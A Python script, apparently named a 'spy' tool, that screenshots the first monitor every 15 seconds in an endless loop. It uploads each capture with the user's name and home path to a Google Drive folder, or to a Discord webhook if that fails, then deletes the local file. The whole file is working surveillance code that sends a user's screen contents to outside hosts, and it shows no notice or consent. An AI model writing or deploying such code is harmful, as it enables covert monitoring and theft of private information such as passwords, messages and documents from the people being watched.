#!/usr/bin/env python

import time, os
from datetime import datetime

from mss import mss
from discord_webhook import DiscordWebhook, DiscordEmbed
from dotenv import load_dotenv

# required if you want to upload screenshots on google drive
from google.oauth2.service_account import Credentials
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError
from googleapiclient.http import MediaFileUpload


load_dotenv('/usr/local/src/spy/.env')

creds = Credentials.from_service_account_file(os.getenv('CREDENTIALS_FILE')) #################### Your Google Service Account Credentials
service = build('drive', 'v3', credentials=creds)
folder_id = os.getenv('FOLDER_ID')                                                       #################### Google Drive Folder

userhome = os.path.expanduser('~')
URL = os.getenv('DISCORD_WEBHOOK_URL')

def upload_file_on_discord(filename):
    content = f'{userhome} - {datetime.now()}'
    webhook = DiscordWebhook(url=URL, content=content, rate_limit_retry=True)
    with open(filename, "rb") as f:
        webhook.add_file(file=f.read(), filename=filename)
    response = webhook.execute()
        
def upload_file_on_google_drive(file_path, folder_id):



    file_name = os.path.basename(file_path)

    file_metadata = {
        'name': file_name,
        'parents' : [folder_id]
    }
    
    media = MediaFileUpload(file_path , resumable=True)
    file = service.files().create(
        body=file_metadata,
        media_body=media,
        fields='id',
        uploadType='resumable'
    ).execute()
    
    #print(f'File ID: {file.get("id")}')
    
    
    """ req_body = {
        'role' : 'reader',
        'type' : 'anyone'
    }
    
    service.permissions().create(
        fileId=file.get("id"),
        body=req_body
    ).execute() """        ######### if you want your file to be public >> by defult its public if your folder is public
    
    link = service.files().get(
        fileId=file.get("id"),
        fields='webViewLink'
    ).execute()
    
    print(link['webViewLink'])
    
    return {
        'id' : file.get("id"),
        'link' : link['webViewLink'],
        'name' : file_name
    }

if __name__ == "__main__":
    # The simplest use, save a screen shot of the 1st monitor
    while True:
        try:
            print(datetime.now(), 'Taking screenshot...')
            with mss() as sct:
                filename=sct.shot(output=f"{userhome}/{datetime.now().strftime('%Y%m%d%H%M%S')}_{os.environ.get('USER')}.png")
                try:
                    print('Uploading file on google drive...', filename)
                    upload_file_on_google_drive(filename, folder_id);os.unlink(filename)
                except Exception as e:
                    print(e)
                    upload_file_on_discord(filename);os.unlink(filename)
        except Exception as e:
            print(e)
        print('sleeping...')
        time.sleep(15)

